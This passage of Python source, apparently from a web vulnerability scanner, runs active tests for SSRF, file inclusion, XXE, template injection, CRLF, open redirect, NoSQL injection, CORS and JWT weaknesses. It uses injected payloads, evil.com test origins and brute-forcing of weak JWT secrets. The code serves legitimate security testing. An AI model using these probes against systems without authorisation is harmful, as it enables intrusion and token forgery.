                                    impact="Full server compromise. Arbitrary command execution.",
                                    remediation="Avoid OS commands. Use language-native APIs.",
                                    cwe_id=78,
                                    cvss_score=9.8,
                                    tags=["cmdi", "output-based", "active"],
                                )
                            )
                            return
            except Exception as e:
                logger.warning(
                    "Command injection test error for %s: %s",
                    point.url,
                    e,
                    exc_info=True,
                )
                continue

    # ── SSRF Scanner ────────────────────────────────────────────────────

    async def _scan_ssrf(self) -> None:
        """Scan para Server-Side Request Forgery."""
        for point in self._injection_points:
            await self._test_ssrf(point)

    async def _test_ssrf(self, point: InjectionPoint) -> None:
        """Testa SSRF."""
        # Only test parameters that look URL-like
        url_param_names = {
            "url",
            "uri",
            "path",
            "redirect",
            "link",
            "src",
            "source",
            "href",
            "file",
            "filename",
            "page",
            "load",
            "fetch",
            "target",
            "proxy",
            "dest",
            "destination",
            "domain",
            "host",
            "site",
            "callback",
            "return",
            "returnurl",
            "return_url",
            "next",
            "image",
            "img",
            "avatar",
            "picture",
            "icon",
            "feed",
            "rss",
            "xml",
            "data",
            "reference",
            "ref",
            "location",
            "go",
            "view",
            "content",
        }

        if point.parameter.lower() not in url_param_names:
            return

        for payload in SSRF_PAYLOADS[:10]:
            try:
                params = dict(point.additional_params)
                params[point.parameter] = payload

                if point.method == "POST":
                    status, headers, body, elapsed = await self._request(
                        point.url, "POST", data=params
                    )
                else:
                    status, headers, body, elapsed = await self._request(
                        point.url, data=params
                    )

                for pattern in SSRF_INDICATORS:
                    match = pattern.search(body)
                    if match:
                        self.result.add_finding(
                            VulnFinding(
                                title=f"SSRF in '{point.parameter}'",
                                category=VulnCategory.SSRF,
                                severity=Severity.HIGH,
                                confidence=Confidence.FIRM,
                                url=point.url,
                                method=point.method,
                                parameter=point.parameter,
                                payload=payload,
                                evidence=match.group(0)[:300],
                                description="Server-Side Request Forgery detected. The server fetches user-supplied URLs.",
                                impact="Internal network scanning, cloud metadata access, port scanning, data exfiltration.",
                                remediation="Whitelist allowed URLs. Block internal/private IP ranges. Disable dangerous URL schemes.",
                                cwe_id=918,
                                cvss_score=7.5,
                                tags=["ssrf", "active"],
                            )
                        )
                        return
            except Exception as e:
                logger.warning(
                    "SSRF test error for %s: %s", point.url, e, exc_info=True
                )
                continue

    # ── LFI Scanner ─────────────────────────────────────────────────────

    async def _scan_lfi(self) -> None:
        """Scan para Local File Inclusion / Path Traversal."""
        for point in self._injection_points:
            await self._test_lfi(point)

    async def _test_lfi(self, point: InjectionPoint) -> None:
        """Testa LFI/Path Traversal."""
        file_params = {
            "file",
            "page",
            "path",
            "template",
            "include",
            "inc",
            "dir",
            "folder",
            "load",
            "read",
            "doc",
            "document",
            "root",
            "pg",
            "style",
            "pdf",
            "lang",
            "language",
            "module",
            "view",
            "content",
            "layout",
            "theme",
            "cat",
            "action",
            "board",
            "date",
            "detail",
            "download",
            "prefix",
            "filename",
            "name",
        }
        if point.parameter.lower() not in file_params:
            return

        for payload in LFI_PAYLOADS[:10]:
            try:
                params = dict(point.additional_params)
                params[point.parameter] = payload

                if point.method == "POST":
                    _, _, body, elapsed = await self._request(
                        point.url, "POST", data=params
                    )
                else:
                    _, _, body, elapsed = await self._request(point.url, data=params)

                for pattern in LFI_SUCCESS_PATTERNS:
                    match = pattern.search(body)
                    if match:
                        self.result.add_finding(
                            VulnFinding(
                                title=f"Local File Inclusion in '{point.parameter}'",
                                category=VulnCategory.LFI,
                                severity=Severity.HIGH,
                                confidence=Confidence.CONFIRMED,
                                url=point.url,
                                method=point.method,
                                parameter=point.parameter,
                                payload=payload,
                                evidence=match.group(0)[:300],
                                description="Local File Inclusion / Path Traversal vulnerability.",
                                impact="Read arbitrary files from the server. Potential RCE via log poisoning.",
                                remediation="Whitelist allowed files. Use indirect references. Validate and sanitize paths.",
                                cwe_id=22,
                                cvss_score=7.5,
                                tags=["lfi", "path-traversal", "active"],
                            )
                        )
                        return
            except Exception as e:
                logger.warning("LFI test error for %s: %s", point.url, e, exc_info=True)
                continue

    # ── XXE Scanner ─────────────────────────────────────────────────────

    async def _scan_xxe(self) -> None:
        """Scan para XML External Entity injection."""
        for point in self._injection_points:
            if point.content_type and "xml" in point.content_type.lower():
                await self._test_xxe(point)
            elif point.parameter.lower() in ("xml", "data", "payload", "body", "input"):
                await self._test_xxe(point)

    async def _test_xxe(self, point: InjectionPoint) -> None:
        for payload in XXE_PAYLOADS[:3]:
            try:
                headers = {"Content-Type": "application/xml"}
                _, _, body, elapsed = await self._request(
                    point.url,
                    method="POST",
                    headers=headers,
                    data=payload,
                )
                for pattern in LFI_SUCCESS_PATTERNS:
                    match = pattern.search(body)
                    if match:
                        self.result.add_finding(
                            VulnFinding(
                                title="XML External Entity (XXE) Injection",
                                category=VulnCategory.XXE,
                                severity=Severity.HIGH,
                                confidence=Confidence.CONFIRMED,
                                url=point.url,
                                method="POST",
                                parameter=point.parameter,
                                payload=payload[:200],
                                evidence=match.group(0)[:300],
                                description="XXE vulnerability allows reading local files via XML entities.",
                                impact="Read arbitrary files, SSRF, denial of service.",
                                remediation="Disable external entities in XML parsers. Use JSON instead of XML.",
                                cwe_id=611,
                                cvss_score=7.5,
                                tags=["xxe", "active"],
                            )
                        )
                        return
            except Exception as e:
                logger.warning("XXE test error for %s: %s", point.url, e, exc_info=True)
                continue

    # ── SSTI Scanner ────────────────────────────────────────────────────

    async def _scan_ssti(self) -> None:
        """Scan para Server-Side Template Injection."""
        for point in self._injection_points:
            await self._test_ssti(point)

    async def _test_ssti(self, point: InjectionPoint) -> None:
        for payload, expected in SSTI_PAYLOADS[:8]:
            if not expected:
                continue
            try:
                params = dict(point.additional_params)
                params[point.parameter] = payload

                if point.method == "POST":
                    _, _, body, _ = await self._request(point.url, "POST", data=params)
                else:
                    _, _, body, _ = await self._request(point.url, data=params)

                if expected in body:
                    sev = (
                        Severity.CRITICAL
                        if "uid=" in expected or "os" in expected
                        else Severity.HIGH
                    )
                    self.result.add_finding(
                        VulnFinding(
                            title=f"Server-Side Template Injection in '{point.parameter}'",
                            category=VulnCategory.SSTI,
                            severity=sev,
                            confidence=Confidence.CONFIRMED,
                            url=point.url,
                            method=point.method,
                            parameter=point.parameter,
                            payload=payload,
                            evidence=f"Expected '{expected}' found in response after injecting template syntax.",
                            description="SSTI allows execution of template directives on the server.",
                            impact="Remote code execution via template engine. Full server compromise.",
                            remediation="Use sandboxed template engines. Never pass user input as template code.",
                            cwe_id=1336,
                            cvss_score=9.8 if sev == Severity.CRITICAL else 7.5,
                            tags=["ssti", "active"],
                        )
                    )
                    return
            except Exception:
                continue

    # ── CRLF Scanner ────────────────────────────────────────────────────

    async def _scan_crlf(self) -> None:
        for point in self._injection_points:
            await self._test_crlf(point)

    async def _test_crlf(self, point: InjectionPoint) -> None:
        for payload in CRLF_PAYLOADS[:4]:
            try:
                params = dict(point.additional_params)
                params[point.parameter] = payload

                if point.method == "POST":
                    _, headers, body, _ = await self._request(
                        point.url, "POST", data=params
                    )
                else:
                    _, headers, body, _ = await self._request(point.url, data=params)

                if "siren=injected" in headers.get("set-cookie", ""):
                    self.result.add_finding(
                        VulnFinding(
                            title=f"CRLF Injection in '{point.parameter}'",
                            category=VulnCategory.CRLF,
                            severity=Severity.MEDIUM,
                            confidence=Confidence.CONFIRMED,
                            url=point.url,
                            method=point.method,
                            parameter=point.parameter,
                            payload=payload,
                            evidence="Injected Set-Cookie header appeared in response.",
                            description="CRLF injection allows injecting HTTP headers.",
                            impact="Session fixation, XSS via header injection, cache poisoning.",
                            remediation="Sanitize CR/LF characters from all user input used in headers.",
                            cwe_id=93,
                            cvss_score=6.1,
                            tags=["crlf", "header-injection", "active"],
                        )
                    )
                    return

                if "x-injected" in headers and headers.get("x-injected") == "true":
                    self.result.add_finding(
                        VulnFinding(
                            title=f"CRLF Header Injection in '{point.parameter}'",
                            category=VulnCategory.CRLF,
                            severity=Severity.MEDIUM,
                            confidence=Confidence.CONFIRMED,
                            url=point.url,
                            method=point.method,
                            parameter=point.parameter,
                            payload=payload,
                            evidence="Injected X-Injected header appeared in response.",
                            cwe_id=93,
                            cvss_score=6.1,
                            tags=["crlf", "active"],
                        )
                    )
                    return
            except Exception:
                continue

    # ── Open Redirect Scanner ───────────────────────────────────────────

    async def _scan_open_redirect(self) -> None:
        for point in self._injection_points:
            if point.parameter.lower() in REDIRECT_PARAMS:
                await self._test_open_redirect(point)

    async def _test_open_redirect(self, point: InjectionPoint) -> None:
        for payload in OPEN_REDIRECT_PAYLOADS[:6]:
            try:
                params = dict(point.additional_params)
                params[point.parameter] = payload

                if point.method == "POST":
                    status, headers, body, _ = await self._request(
                        point.url, "POST", data=params
                    )
                else:
                    status, headers, body, _ = await self._request(
                        point.url, data=params
                    )

                location = headers.get("location", "")
                if status in (301, 302, 303, 307, 308) and "evil.com" in location:
                    self.result.add_finding(
                        VulnFinding(
                            title=f"Open Redirect in '{point.parameter}'",
                            category=VulnCategory.OPEN_REDIRECT,
                            severity=Severity.MEDIUM,
                            confidence=Confidence.CONFIRMED,
                            url=point.url,
                            method=point.method,
                            parameter=point.parameter,
                            payload=payload,
                            evidence=f"Location: {location}",
                            description="Open redirect allows redirecting users to arbitrary URLs.",
                            impact="Phishing attacks, OAuth token theft, reputation damage.",
                            remediation="Whitelist allowed redirect destinations. Use relative URLs.",
                            cwe_id=601,
                            cvss_score=4.7,
                            tags=["redirect", "active"],
                        )
                    )
                    return

                # Check meta refresh or JS redirect in body
                if "evil.com" in body:
                    meta_redirect = re.search(
                        r'<meta[^>]*http-equiv=["\']refresh["\'][^>]*content=["\'][^"\']*evil\.com',
                        body,
                        re.I,
                    )
                    js_redirect = re.search(
                        r'(?:window\.location|document\.location|location\.href)\s*=\s*["\'][^"\']*evil\.com',
                        body,
                        re.I,
                    )
                    if meta_redirect or js_redirect:
                        self.result.add_finding(
                            VulnFinding(
                                title=f"Open Redirect (DOM/Meta) in '{point.parameter}'",
                                category=VulnCategory.OPEN_REDIRECT,
                                severity=Severity.MEDIUM,
                                confidence=Confidence.FIRM,
                                url=point.url,
                                parameter=point.parameter,
                                payload=payload,
                                evidence="Redirect target reflected in page body.",
                                cwe_id=601,
                                cvss_score=4.7,
                                tags=["redirect", "dom", "active"],
                            )
                        )
                        return
            except Exception:
                continue

    # ── NoSQL Injection Scanner ─────────────────────────────────────────

    async def _scan_nosqli(self) -> None:
        for point in self._injection_points:
            await self._test_nosqli(point)

    async def _test_nosqli(self, point: InjectionPoint) -> None:
        # Boolean-based NoSQL injection
        try:
            params_true = dict(point.additional_params)
            params_true[point.parameter] = '{"$gt":""}'
            params_false = dict(point.additional_params)
            params_false[point.parameter] = '{"$gt":"zzzzzzzzzzzz_impossible"}'

            if point.method == "POST":
                s1, _, body1, _ = await self._request(
                    point.url, "POST", data=params_true
                )
                s2, _, body2, _ = await self._request(
                    point.url, "POST", data=params_false
                )
            else:
                s1, _, body1, _ = await self._request(point.url, data=params_true)
                s2, _, body2, _ = await self._request(point.url, data=params_false)

            if len(body1) > 100 and self._similarity(body1, body2) < 0.5:
                self.result.add_finding(
                    VulnFinding(
                        title=f"NoSQL Injection in '{point.parameter}'",
                        category=VulnCategory.NOSQLI,
                        severity=Severity.HIGH,
                        confidence=Confidence.FIRM,
                        url=point.url,
                        method=point.method,
                        parameter=point.parameter,
                        payload='{"$gt":""}',
                        evidence=f"Differential response: true={len(body1)} bytes, false={len(body2)} bytes",
                        description="NoSQL injection allows bypassing authentication or extracting data from NoSQL databases.",
                        impact="Authentication bypass, data extraction, denial of service.",
                        remediation="Use parameterized queries. Validate input types. Sanitize MongoDB operators.",
                        cwe_id=943,
                        cvss_score=8.6,
                        tags=["nosqli", "active"],
                    )
                )
        except Exception as e:
            logger.debug("NoSQL injection scan error: %s", e)

    # ── CORS Scanner ────────────────────────────────────────────────────

    async def _scan_cors(self) -> None:
        """Scan para CORS misconfiguration."""
        test_origins = [
            "https://evil.com",
            "https://null",
            f"https://{urllib.parse.urlparse(self.config.target_url).netloc}.evil.com",
            "null",
        ]

        for origin in test_origins:
            try:
                headers = {"Origin": origin}
                status, resp_headers, body, _ = await self._request(
                    self.config.target_url, headers=headers
                )

                acao = resp_headers.get("access-control-allow-origin", "")
                acac = resp_headers.get("access-control-allow-credentials", "")

                if acao == origin or acao == "*":
                    severity = (
                        Severity.HIGH if acac.lower() == "true" else Severity.MEDIUM
                    )
                    self.result.add_finding(
                        VulnFinding(
                            title=f"CORS Misconfiguration: Allows '{origin}'",
                            category=VulnCategory.CORS,
                            severity=severity,
                            confidence=Confidence.CONFIRMED,
                            url=self.config.target_url,
                            evidence=(
                                f"Origin: {origin}\n"
                                f"Access-Control-Allow-Origin: {acao}\n"
                                f"Access-Control-Allow-Credentials: {acac}"
                            ),
                            description="CORS policy allows requests from untrusted origins.",
                            impact="Cross-origin data theft. Attacker can read sensitive data from authenticated sessions.",
                            remediation="Whitelist specific trusted origins. Never reflect arbitrary Origin headers.",
                            cwe_id=942,
                            cvss_score=7.5 if acac.lower() == "true" else 5.3,
                            tags=["cors", "passive", "misconfig"],
                        )
                    )
                    return
            except Exception:
                continue

    # ── JWT Scanner ─────────────────────────────────────────────────────

    async def _scan_jwt(self) -> None:
        """Scan para JWT vulnerabilities."""
        # Check cookies and responses for JWTs
        try:
            _, headers, body, _ = await self._request(self.config.target_url)

            # Find JWTs in cookies
            set_cookie = headers.get("set-cookie", "")
            jwt_pattern = re.compile(
                r"eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+"
            )

            tokens = jwt_pattern.findall(set_cookie) + jwt_pattern.findall(body)

            for token in tokens[:3]:
                await self._test_jwt(token)
        except Exception as e:
            logger.debug("JWT discovery error: %s", e)

    async def _test_jwt(self, token: str) -> None:
        """Testa vulnerabilidades em um JWT especifico."""
        try:
            parts = token.split(".")
            if len(parts) != 3:
                return

            # Decode header
            header_b64 = parts[0] + "=" * (4 - len(parts[0]) % 4)
            header = json.loads(base64.urlsafe_b64decode(header_b64))

            # Decode payload
            payload_b64 = parts[1] + "=" * (4 - len(parts[1]) % 4)
            payload = json.loads(base64.urlsafe_b64decode(payload_b64))

            alg = header.get("alg", "")

            # Check 'none' algorithm
            if alg.lower() in ("none", ""):
                self.result.add_finding(
                    VulnFinding(
                        title="JWT with 'none' Algorithm",
                        category=VulnCategory.JWT,
                        severity=Severity.CRITICAL,
                        confidence=Confidence.CONFIRMED,
                        url=self.config.target_url,
                        evidence=f"Algorithm: {alg}\nPayload: {json.dumps(payload, indent=2)[:500]}",
                        description="JWT uses 'none' algorithm, allowing unsigned tokens.",
                        impact="Complete authentication bypass. Forge arbitrary JWT tokens.",
                        remediation="Enforce algorithm validation. Never accept 'none' algorithm.",
                        cwe_id=345,
                        cvss_score=9.8,
                        tags=["jwt", "none-alg", "active"],
                    )
                )

            # Check weak HMAC secrets
            if alg.startswith("HS"):
                for secret in JWT_WEAK_SECRETS:
                    try:
                        signing_input = f"{parts[0]}.{parts[1]}".encode()
                        hash_alg = {
                            "HS256": "sha256",
                            "HS384": "sha384",
                            "HS512": "sha512",
                        }.get(alg, "sha256")
                        expected_sig = (
                            base64.urlsafe_b64encode(
                                hmac.new(
                                    secret.encode(), signing_input, hash_alg
                                ).digest()
                            )
                            .rstrip(b"=")
                            .decode()
                        )

                        if expected_sig == parts[2]:
                            self.result.add_finding(
                                VulnFinding(
                                    title="JWT with Weak HMAC Secret",
                                    category=VulnCategory.JWT,
                                    severity=Severity.CRITICAL,
                                    confidence=Confidence.CONFIRMED,
                                    url=self.config.target_url,
                                    payload=f"Secret: {secret}",
                                    evidence=f"Algorithm: {alg}\nSecret cracked: '{secret}'",
                                    description=f"JWT HMAC secret is weak ('{secret}'). Tokens can be forged.",
                                    impact="Complete authentication bypass. Forge tokens with any claims.",
                                    remediation="Use strong, random secrets (256+ bits). Rotate secrets regularly.",
                                    cwe_id=326,
                                    cvss_score=9.8,
                                    tags=["jwt", "weak-secret", "active"],
                                )
                            )
                            return
                    except Exception:
                        continue

            # Check expired but accepted tokens
            exp = payload.get("exp")
            if exp and isinstance(exp, (int, float)):
                if exp < time.time():
                    self.result.add_finding(
                        VulnFinding(
                            title="Expired JWT Token in Use",
                            category=VulnCategory.JWT,
                            severity=Severity.MEDIUM,
                            confidence=Confidence.FIRM,
                            url=self.config.target_url,
                            evidence=f"Token expired at: {datetime.fromtimestamp(exp).isoformat()}",
                            description="An expired JWT token is still being served/used.",
                            impact="Token replay attacks if expired tokens are not properly validated.",
                            remediation="Implement proper token expiration validation server-side.",
                            cwe_id=613,
                            cvss_score=5.4,
                            tags=["jwt", "expired", "passive"],
                        )
                    )

            # Check sensitive data in payload
            sensitive_keys = {
                "password",
                "secret",
                "credit_card",
                "ssn",
                "api_key",
                "private_key",
            }
            found_sensitive = [k for k in payload.keys() if k.lower() in sensitive_keys]
            if found_sensitive:
                self.result.add_finding(
                    VulnFinding(
                        title="Sensitive Data in JWT Payload",
                        category=VulnCategory.JWT,
                        severity=Severity.HIGH,
                        confidence=Confidence.CONFIRMED,
                        url=self.config.target_url,
                        evidence=f"Sensitive keys found: {', '.join(found_sensitive)}",
                        description="JWT payload contains sensitive data that should not be client-accessible.",
                        impact="Information disclosure. JWT payloads are base64-encoded, not encrypted.",
                        remediation="Never store sensitive data in JWT payloads. Use encrypted JWTs (JWE) if needed.",
                        cwe_id=200,
                        cvss_score=7.5,
                        tags=["jwt", "sensitive-data", "passive"],
                    )
                )

        except Exception as e:
            logger.debug("JWT sensitive data analysis error: %s", e)

    # ── Utility Methods ─────────────────────────────────────────────────

    def _similarity(self, a: str, b: str) -> float:
        """Calcula similaridade entre duas strings (0.0 a 1.0)."""
        if not a and not b:
            return 1.0
        if not a or not b:
            return 0.0
        if a == b:
            return 1.0

        # Use length-based similarity for speed
        len_sim = 1.0 - abs(len(a) - len(b)) / max(len(a), len(b))

        # Sample character comparison
        sample_size = min(500, len(a), len(b))
        if sample_size == 0:
            return len_sim

        matches = sum(1 for i in range(sample_size) if a[i] == b[i])
        char_sim = matches / sample_size

        return len_sim * 0.3 + char_sim * 0.7


# ════════════════════════════════════════════════════════════════════════════
# CONVENIENCE FUNCTIONS
# ════════════════════════════════════════════════════════════════════════════


async def quick_scan(target_url: str, **kwargs) -> ScanResult:
    """Scan rapido com configuracoes default."""
    config = ScanConfig(target_url=target_url, **kwargs)
    scanner = SirenScanner(config)
    return await scanner.run()


async def deep_scan(target_url: str, **kwargs) -> ScanResult:
    """Scan profundo com todas as opcoes ativadas."""
    config = ScanConfig(
        target_url=target_url,
        max_depth=10,
        max_pages=500,
        aggressive_mode=True,
        **kwargs,
    )
    scanner = SirenScanner(config)
    return await scanner.run()


def scan_sync(target_url: str, **kwargs) -> ScanResult:
    """Wrapper sincrono."""
    return asyncio.run(quick_scan(target_url, **kwargs))
